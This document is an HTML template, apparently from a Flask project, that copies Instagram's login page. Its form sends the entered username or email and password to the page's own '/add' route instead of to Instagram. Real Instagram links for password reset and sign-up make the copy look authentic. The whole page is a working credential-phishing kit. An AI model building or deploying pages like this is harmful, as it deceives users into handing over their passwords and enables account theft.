<html>

<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="{{ url_for('static', filename='images/favicon.png')}}" type="image/icon">
    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='styles.css')}}">
</head>

<body>
    <div class="container">
        <div class="page">
            <div class="logo">
                <img src="{{ url_for('static', filename='images/instagram.png')}}" alt="instagram" style="width: 175px;">
            </div>

            <br/>
            <form class="container" action="/add" method="POST">
                <input type="text" placeholder="Phone number, username, or email" name="email" required>
                <input type="password" placeholder="Password" name="password" required>
                <button class="submitbutton">Log in</button>
                <br/>
                <div class="option">OR </div>
            </form>

            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#"> Log in With Facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>
            <div class="singup">
                <p>Don't have an account?<a href="https://www.instagram.com/accounts/signup/phone">Sign up</a></p>
            </div>

        </div>
    </div>

    <br/>
    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
        <p style="text-align:center;"></p>
    </div>
    <br/>
    <script>
      window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
    </script>
    <script defer src="/_vercel/insights/script.js"></script>
</body>

</html>
